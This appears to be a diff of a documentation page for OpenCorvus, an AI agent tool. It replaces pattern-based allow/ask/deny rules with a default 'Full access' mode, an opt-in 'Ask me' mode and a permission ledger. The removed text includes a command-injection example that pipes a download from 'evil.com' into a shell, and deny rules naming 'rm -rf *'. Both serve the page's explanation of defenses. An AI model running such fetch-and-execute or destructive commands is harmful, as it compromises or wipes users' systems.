@@ -1,108 +1,28 @@
 ---
 title: Permissions
-description: Allow / ask / deny rules and the default-allow permission policy in OpenCorvus.
+description: Choose Full access or Ask me and manage exact-scope approvals.
 ---
 
-Any tool that writes files, runs commands, or calls external APIs must pass a permission check. Implementation: `packages/opencorvus/src/permission/next.ts`.
+OpenCorvus has one authorization setting for new Tasks and direct Sessions:
 
-## Three actions
+- **Full access** is the default. Permission-bearing Tool, Model Context Protocol (MCP), Browser, Computer, plugin, network, process, write, publication, schedule, and external-service invocations execute without an OpenCorvus approval prompt.
+- **Ask me** is an explicit operator choice. Permission-bearing invocations pause before execution.
 
-| action  | semantics                                                                                     |
-| ------- | --------------------------------------------------------------------------------------------- |
-| `allow` | pass silently                                                                                 |
-| `ask`   | pause, emit `permission.asked`, and wait for an operator reply until the reject timeout fires |
-| `deny`  | throw `DeniedError` and abort the tool call                                                   |
+Identity, authentication, canonical-path, stale-runtime, Task ownership, and data-integrity checks remain active in both modes. Tool installation and agent capability assignment are separate controls; they decide what can be offered, not whether a concrete invocation is approved.
 
-## Config format
+## Ask me decisions
 
-```jsonc
-{
-  "permission": {
-    "bash": {
-      "~/projects/*": "allow",
-      "npm run *": "allow",
-      "rm -rf *": "deny",
-      "*": "ask",
-    },
-    "skill": {
-      "local-note": "deny",
-      "sora": "ask",
-    },
-    "write": {
-      "~/projects/**/*.md": "allow",
-      "*": "ask",
-    },
-  },
-}
-```
+Each request displays the provider, Tool, effect class, normalized arguments with secrets redacted, and the owning Task or Session. Depending on the effect, it offers:
 
-## Last-match-wins
+- **Allow once** for this exact invocation;
+- **Allow for this Task** for the exact typed scope and current Task;
+- **Always allow this exact scope** for eligible project-scoped reads, writes, processes, and network reads;
+- **Deny**.
 
-:::caution
-The **biggest footgun** in the permission system: **later declarations override earlier ones**.
-:::
+Changed arguments, destination, path, provider digest, Tool, or effect class create a new request. Destructive, credential-release, and external-effect calls cannot receive a project-wide grant.
 
-`PermissionNext.evaluate()` (`src/permission/next.ts`) uses `findLast` to scan the merged ruleset, so:
+## Durable history and recovery
 
-```jsonc
-{
-  "bash": {
-    "*": "ask", // catch-all
-    "npm run *": "allow", // ← effective (comes after *)
-  },
-}
-```
+Requests, decisions, grant uses, revocations, and execution outcomes are appended to the permission ledger. The settings page lists active grants and recent history and can revoke a grant. Pending requests survive runtime restart; they do not time out or silently change mode. If a runtime stops after an effect starts but before its outcome is known, OpenCorvus records an unknown outcome and will not blindly repeat it.
 
-Reversed order breaks:
-
-```jsonc
-{
-  "bash": {
-    "npm run *": "allow", // ← shadowed by *
-    "*": "ask",
-  },
-}
-```
-
-## Bash command normalization
-
-`BashArity` (`src/permission/arity.ts`) normalizes shell commands to "semantic command prefixes" before pattern-matching, preventing bypass via injection:
-
-| Input                     | Normalized                             |
-| ------------------------- | -------------------------------------- |
-| `npm run test`            | `npm run test`                         |
-| `npm run test -- --watch` | `npm run test` (flags stripped)        |
-| `cd foo && npm run test`  | `npm run test` (leading `cd` stripped) |
-
-`npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.
-
-## Default-allow policy
-
-Fixed identities receive their permission profiles from `nativeAgentPermissionProfiles` and their owning registry. Projected workers receive tool capability from the active expert-squad resolver projection and the installed runtime contract. Permission decides what happens after a projected tool is available; it never creates a tool grant.
-
-User config is merged after the built-in allow rules, so explicit user rules still win. Set `deny` to block a tool/pattern, or `ask` to require an operator approval.
-
-```jsonc
-{
-  "permission": {
-    "bash": {
-      "*": "allow",
-      "rm -rf *": "deny",
-    },
-    "write": {
-      "*": "allow",
-      "~/projects/locked/**": "ask",
-    },
-  },
-}
-```
-
-An explicit `ask` is a real operator approval path: `PermissionNext.ask()` emits `permission.asked`, stores the pending request, and proceeds after a reply. If nobody replies, the request is rejected after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default **300000 ms**, minimum **1000 ms**; see `packages/opencorvus/src/permission/next.ts`).
-
-```bash
-export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # reject unanswered asks after 60s
-```
-
-## No silent fallback on config error
-
-If a permission string is malformed (e.g. `"allow"` written as a string instead of an object), OpenCorvus **throws loudly** rather than silently misinterpreting it. `PermissionNext.fromConfig` validates the config shape before building the rule set (`src/permission/next.ts`).
+The mode is frozen when a Session first performs a permission-bearing invocation. Changing the setting affects new work.
